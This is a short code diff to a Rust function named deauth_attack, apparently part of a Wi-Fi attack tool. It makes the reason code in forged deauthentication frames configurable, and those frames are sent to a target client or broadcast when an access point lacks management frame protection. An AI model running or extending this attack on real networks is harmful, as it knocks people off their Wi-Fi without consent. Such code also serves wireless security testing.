@@ -257,6 +257,8 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
         return Ok(());
     }
 
+    let reason_code = &oxide.deauth_code;
+
     if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
         if let Some(mac_address) = oxide.deauth_target {
             let deauth_client = mac_address;
@@ -265,7 +267,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                 ap_mac,
                 &mac_address,
                 oxide.counters.sequence1(),
-                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+                reason_code.clone(),
             );
             let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
@@ -289,7 +291,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                 ap_mac,
                 &MacAddress::broadcast(),
                 oxide.counters.sequence1(),
-                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+                reason_code.clone(),
             );
             let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
